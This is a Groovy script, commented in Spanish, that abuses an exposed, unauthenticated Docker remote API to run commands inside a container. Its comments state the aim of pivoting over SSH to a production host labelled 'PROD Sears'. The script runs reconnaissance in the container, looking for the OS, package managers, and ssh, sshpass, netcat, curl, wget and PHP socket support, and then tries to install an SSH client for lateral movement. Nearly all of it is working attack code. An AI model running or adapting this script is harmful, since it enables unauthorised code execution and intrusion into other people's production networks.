// Intentar instalar openssh-clients en el container vía Docker API
// y luego hacer pivot SSH a PROD Sears 172.27.141.24
import groovy.json.JsonOutput
import groovy.json.JsonSlurper

def dockerApi = "http://172.27.140.148:4243"
def containerId = "5b32e909c295"

def httpPost = { String urlStr, String jsonBody ->
  def conn = (HttpURLConnection) new URL(urlStr).openConnection()
  conn.setRequestMethod("POST")
  conn.setDoOutput(true)
  conn.setConnectTimeout(8000)
  conn.setReadTimeout(120000)
  conn.setRequestProperty("Content-Type", "application/json")
  if (jsonBody) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
  def code = conn.getResponseCode()
  def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
  conn.disconnect()
  return [code: code, body: body]
}

def execIn = { String cmd ->
  def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + JsonOutput.toJson(cmd) + ']}'
  def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
  if (r1.code != 201) return "EXEC_CREATE_FAIL HTTP ${r1.code}: ${r1.body}"
  def execId = new JsonSlurper().parseText(r1.body).Id
  def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
  return r2.body
}

// Step 1: Check OS, package manager, and look for binaries
def checkEnv = '''
echo "=== OS INFO ==="
cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null || echo "OS unknown"
echo ""
echo "=== PACKAGE MANAGERS ==="
which yum 2>/dev/null && echo "HAS_YUM"
which dnf 2>/dev/null && echo "HAS_DNF"
which apt-get 2>/dev/null && echo "HAS_APT"
which apk 2>/dev/null && echo "HAS_APK"
echo ""
echo "=== FIND SSH BINARIES ==="
find / -name "ssh" -type f 2>/dev/null | head -5
find / -name "openssh" -type f 2>/dev/null | head -3
find / -name "sshpass" -type f 2>/dev/null | head -3
echo ""
echo "=== FIND PYTHON/NC/CURL ==="
find /usr -name "python*" -type f 2>/dev/null | head -5
find /usr -name "nc" -o -name "netcat" -o -name "ncat" 2>/dev/null | head -5
which curl 2>/dev/null && echo "HAS_CURL"
which wget 2>/dev/null && echo "HAS_WGET"
echo ""
echo "=== PHP EXTENSIONS (ssh2) ==="
php -r "echo extension_loaded('ssh2') ? 'HAS_PHP_SSH2' : 'NO_PHP_SSH2';" 2>/dev/null
php -r "echo extension_loaded('sockets') ? 'HAS_PHP_SOCKETS' : 'NO_PHP_SOCKETS';" 2>/dev/null
echo ""
echo "=== CONTAINER IP ==="
hostname -I
ip addr 2>/dev/null || ifconfig 2>/dev/null | head -30
'''

println "=== STEP 1: CHECK CONTAINER ENV ==="
println execIn(checkEnv)

// Step 2: Try to install openssh-clients
def installCmd = '''
echo "=== INSTALL ATTEMPT ==="
if which yum 2>/dev/null; then
  yum install -y openssh-clients 2>&1 | tail -5
elif which apt-get 2>/dev/null; then
  apt-get install -y openssh-client 2>&1 | tail -5
elif which apk 2>/dev/null; then
  apk add --no-cache openssh-client 2>&1 | tail -5
else
  echo "NO_PKG_MANAGER"
fi
echo "=== SSH AFTER INSTALL ==="
which ssh 2>/dev/null || find /usr -name ssh 2>/dev/null | head -3
'''

println "\n=== STEP 2: INSTALL SSH ==="
println execIn(installCmd)

println "=== FIN CONTAINER ENV ==="
